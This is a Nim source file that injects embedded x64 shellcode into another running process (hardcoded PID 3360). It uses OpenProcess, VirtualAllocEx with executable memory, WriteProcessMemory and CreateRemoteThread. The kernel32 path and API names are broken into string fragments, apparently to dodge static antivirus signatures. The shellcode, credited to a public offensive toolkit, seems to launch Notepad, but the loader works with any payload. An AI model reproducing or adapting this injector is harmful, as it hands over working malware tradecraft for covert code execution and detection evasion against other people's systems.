import dynlib
import winim/lean

# https://github.com/FuzzySecurity/Sharp-Suite/blob/master/DesertNut/DesertNut_h.cs#L225
var shellcode: array[344, byte] = [byte 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
            0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
            0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
            0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
            0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
            0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
            0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
            0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
            0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
            0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
            0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
            0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
            0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
            0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
            0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
            0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
            0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
            0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
            0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
            0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
            0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
            0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3]
            
type 
 OP = proc(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.gcsafe, stdcall.}
 VAL = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.gcsafe, stdcall.}
 WPM = proc(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL {.gcsafe, stdcall.}
 CRT = proc(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.gcsafe, stdcall.}

let lib = loadLib(r"C:\Win" & r"dows\Sys" & r"tem32\" & "ker" & "nel" & "32." & "d" & "ll")
if lib != nil:
    let op = cast[OP](lib.symAddr("Ope" & "nP" & "rocess"))
    let handle = op(0x001F0FFF, false, 3360)
    echo "handle: ", handle
    let alloc = cast[VAL](lib.symAddr("Virtua" & "lAllo" & "cE" & "x"))
    let allocRes = alloc(handle, NULL, uint(shellcode.len), 12288, 0x40)
    echo "has been alloced"
    let writep = cast[WPM](lib.symAddr("Writ" & "eProces" & "sMemo" & "ry"))
    let writeres = writep(handle, allocRes, unsafeAddr shellcode, uint(shellcode.len), NULL)
    let temp = cast[LPTHREAD_START_ROUTINE](allocRes)
    let xx = cast[CRT](lib.symAddr("Creat" & "eRemot" & "eThre" & "ad"))
    discard xx(handle, NULL, 0, temp, NULL, 0, NULL)
    echo "thread created"